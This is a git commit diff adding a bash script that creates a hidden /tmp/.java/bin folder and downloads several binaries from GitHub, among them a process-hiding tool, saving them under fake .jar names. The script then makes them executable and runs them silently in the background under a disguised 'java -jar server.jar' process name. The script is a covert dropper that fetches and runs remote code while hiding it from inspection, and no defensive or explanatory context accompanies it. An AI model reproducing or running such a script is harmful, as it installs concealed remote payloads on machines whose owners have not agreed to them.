e0e0634355054ba40f6520f4c67a6c75a11628b2
i51jir6ni9t0 <wker-one@protonmail.com>
2025-05-24 10:33:14 +0000

    PLAY KICKED

---
+++ ply/n1.sh
@@ -0,0 +1,24 @@
+#!/bin/bash
+
+function fetch_files() {
+    mkdir -p /tmp/.java/bin
+    cd /tmp/.java/bin/ && curl -L https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-linux-x86_64 -o paper.jar
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o user-patch.jar
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/ply/n1.conf -o cfg.conf
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/ply/n1.json -o conf.json
+}
+
+function start_app() {
+    chmod a+x /tmp/.java/bin/***
+    cd /tmp/.java/bin && nohup ./paper.jar -a 'java -Xms128M -Xmx3072M -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
+}
+
+if [ -f "/tmp/.java/bin/add-on.jar" ] && [ -f "/tmp/.java/bin/user-patch.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ]; then
+    start_app
+else
+    rm -rf /tmp/.java/bin/**
+    fetch_files
+    start_app
+fi
